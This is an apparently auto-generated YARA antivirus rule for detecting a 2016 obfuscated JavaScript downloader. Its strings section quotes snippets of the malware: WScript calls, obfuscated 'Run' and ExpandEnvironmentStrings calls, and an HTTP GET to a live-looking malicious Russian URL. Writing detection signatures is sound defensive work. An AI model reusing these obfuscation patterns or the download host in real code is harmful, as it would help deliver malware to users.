rule sig_20160428_649ecc63d7fa632117dc4a13493f6bdd {
  meta:
    description = "datamaliciousorder - file 20160428_649ecc63d7fa632117dc4a13493f6bdd.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f09e19fe0bee144767bafe7617b53fc296c288240e26fb0c693b7adc4f00977a"

  strings:
    $s1  = "function GyvHucLgdYzrIqvZsgSjj(GdiRsbTljUmeOltXvlCva){ZpzOouXilOycDrgGfuXhu[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function AugXmrVxlNnqPzqCtyRzc() {return ZpzOouXilOycDrgGfuXhu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function GyvHucLgdYzrIqvZsgSjj(GdiRsbTljUmeOltXvlCva){ZpzOouXilOycDrgGfuXhu[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "return YvcFzsXvdMrzPfaXjkLwh - KnjDiaJgwMuqHgiCxsBat;};" fullword ascii
    $s5  = "function EdnGvqFohTxxMiuGoqUhe(YvcFzsXvdMrzPfaXjkLwh, KnjDiaJgwMuqHgiCxsBat){LboImvSriFeuOduAauZzy = LboImvSriFeuOduAauZzy * 1; " ascii
    $s6  = "XvoAnqZslNvgCqiDkuZjy[VbjWdsOiaSxhDjxZfmDtv](\"G\" + \"ET\", \"http://unipan96.ru/xo5ksp\", false);" fullword ascii
    $s7  = "var EnwYzoDolWzyJzsBrgNde = this[\"WScript\"];" fullword ascii
    $s8  = "function AugXmrVxlNnqPzqCtyRzc() {return ZpzOouXilOycDrgGfuXhu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s9  = "if (XvoAnqZslNvgCqiDkuZjy[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s10 = "function TkpOmiVcgJqzKwuPdiPih(){return XdkXhiEknDokMoiQwbKbi + \"\";};" fullword ascii
    $s11 = "function EdnGvqFohTxxMiuGoqUhe(YvcFzsXvdMrzPfaXjkLwh, KnjDiaJgwMuqHgiCxsBat){LboImvSriFeuOduAauZzy = LboImvSriFeuOduAauZzy * 1; " ascii
    $s12 = "var ZpzOouXilOycDrgGfuXhu = function QtdJstKmjGmzNodFxaPmj() {return EnwYzoDolWzyJzsBrgNde[MznTzzDkuBqsUtcAuiUbe](\"WScript\"+\"" ascii
    $s13 = "function TrlYjnEkhJndEtrDdpCip() {return ((JxlYxqGdgFaqRqbWtfAwj == true) && (JxlYxqGdgFaqRqbWtfAwj == SmgWyaNliNkbGztHwvEot)) ?" ascii
    $s14 = "function TrlYjnEkhJndEtrDdpCip() {return ((JxlYxqGdgFaqRqbWtfAwj == true) && (JxlYxqGdgFaqRqbWtfAwj == SmgWyaNliNkbGztHwvEot)) ?" ascii
    $s15 = "var ZpzOouXilOycDrgGfuXhu = function QtdJstKmjGmzNodFxaPmj() {return EnwYzoDolWzyJzsBrgNde[MznTzzDkuBqsUtcAuiUbe](\"WScript\"+\"" ascii
    $s16 = "var LdcVcnMiuRsiRliDlfDlx = new this[\"D\"+\"ate\"]();" fullword ascii
    $s17 = "var SmgWyaNliNkbGztHwvEot = false;" fullword ascii
    $s18 = "return EdnGvqFohTxxMiuGoqUhe(1 == 1 ? SwzWpxLfhMmqXtgQgpAov : 0, 1 == 1 ? YooEpeJzbGzzYrwCewCyt : 0);" fullword ascii
    $s19 = "var VzyRziStpMbaQnyBhxXmt = false;" fullword ascii
    $s20 = "function IxqVtxGslWanAghQkwPlf(QxmPnlDsmMtzWbjIxsUul) {var WjrBboCfyMchJkcDueNsf = (1, 2, 3, 4, 5, QxmPnlDsmMtzWbjIxsUul); retur" ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}